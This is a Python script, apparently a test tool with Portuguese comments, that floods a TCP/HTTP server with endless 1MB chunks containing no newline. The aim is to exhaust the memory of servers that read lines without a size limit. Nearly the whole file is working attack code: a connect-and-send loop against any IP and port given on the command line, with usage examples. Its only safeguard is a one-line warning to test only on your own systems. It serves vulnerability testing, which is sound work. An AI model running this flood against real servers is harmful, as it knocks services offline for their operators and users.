#!/usr/bin/env python
"""
DoS/Flood Attack Test Script
=============================

Testa vulnerabilidade de buffer overflow em servidores que usam read_line()
sem limite de tamanho. Envia dados continuamente sem newline (\n) para forçar
crescimento ilimitado do buffer na Heap.

ATENÇÃO: Usar APENAS em ambientes de teste próprios.
"""

import socket
import argparse
import time
import signal
import sys


class AttackStats:
    """Tracks attack metrics for reporting."""
    def __init__(self):
        self.bytes_sent = 0
        self.chunks_sent = 0
        self.start_time = time.time()
        self.running = True

    def update(self, bytes_count: int):
        self.bytes_sent += bytes_count
        self.chunks_sent += 1

    def report(self):
        elapsed = time.time() - self.start_time
        mb_sent = self.bytes_sent / (1024 * 1024)
        rate_mbps = mb_sent / elapsed if elapsed > 0 else 0

        print("\n" + "="*60)
        print("ATTACK STATISTICS")
        print("="*60)
        print(f"Duration:      {elapsed:.2f}s")
        print(f"Data Sent:     {mb_sent:.2f} MB ({self.bytes_sent:,} bytes)")
        print(f"Chunks Sent:   {self.chunks_sent:,}")
        print(f"Send Rate:     {rate_mbps:.2f} MB/s")
        print("="*60)


def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully."""
    print("\n\n[!] Attack interrupted by user (Ctrl+C)")
    if 'stats' in globals():
        stats.report()
    sys.exit(0)


def run_dos_attack(
    target_ip: str,
    target_port: int,
    chunk_size: int,
    delay: float
):
    """
    Execute DoS flood attack.

    Args:
        target_ip: Target server IP
        target_port: Target server port
        chunk_size: Size of each data chunk in bytes
        delay: Delay between sends in seconds (0 for no delay)
    """
    global stats
    stats = AttackStats()

    print(f"\n[*] Target: {target_ip}:{target_port}")
    print(f"[*] Chunk Size: {chunk_size / 1024:.1f} KB")
    print(f"[*] Delay: {delay}s between chunks")
    print(f"[*] Attack Mode: Buffer overflow via missing newline")
    print(f"\n[!] Starting attack... Press Ctrl+C to stop\n")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        print(f"[+] Connected to {target_ip}:{target_port}")

        # Payload: continuous data without newline
        chunk = b"A" * chunk_size

        while stats.running:
            bytes_sent = sock.send(chunk)
            stats.update(bytes_sent)

            if stats.chunks_sent % 10 == 0:
                elapsed = time.time() - stats.start_time
                mb_sent = stats.bytes_sent / (1024 * 1024)
                print(f"[→] Sent: {mb_sent:.2f} MB | Chunks: {stats.chunks_sent} | Time: {elapsed:.1f}s")

            if delay > 0:
                time.sleep(delay)

    except ConnectionRefusedError:
        print("\n[✗] ERROR: Connection refused. Is the server running?")
        sys.exit(1)
    except BrokenPipeError:
        print("\n[!] Server closed connection (possibly crashed or protected)")
        stats.report()
    except Exception as e:
        print(f"\n[✗] Connection error: {e}")
        stats.report()
    finally:
        try:
            sock.close()
        except:
            pass


def main():
    parser = argparse.ArgumentParser(
        description="DoS Buffer Overflow Test for HTTP servers using unbounded read_line()",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack on localhost
  python dos_attack_test.py

  # Custom target with 5MB chunks
  python dos_attack_test.py -t 192.168.1.10 -p 3000 -c 5242880

  # Slower attack with 100ms delay between chunks
  python dos_attack_test.py -d 0.1
        """
    )

    parser.add_argument(
        "-t", "--target",
        default="127.0.0.1",
        help="Target IP address (default: 127.0.0.1)"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=8080,
        help="Target port (default: 8080)"
    )
    parser.add_argument(
        "-c", "--chunk-size",
        type=int,
        default=1024 * 1024,  # 1MB
        help="Size of each chunk in bytes (default: 1048576 = 1MB)"
    )
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=0.0,
        help="Delay between sends in seconds (default: 0.0)"
    )

    args = parser.parse_args()

    # Register signal handler for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)

    run_dos_attack(
        target_ip=args.target,
        target_port=args.port,
        chunk_size=args.chunk_size,
        delay=args.delay
    )


if __name__ == "__main__":
    main()
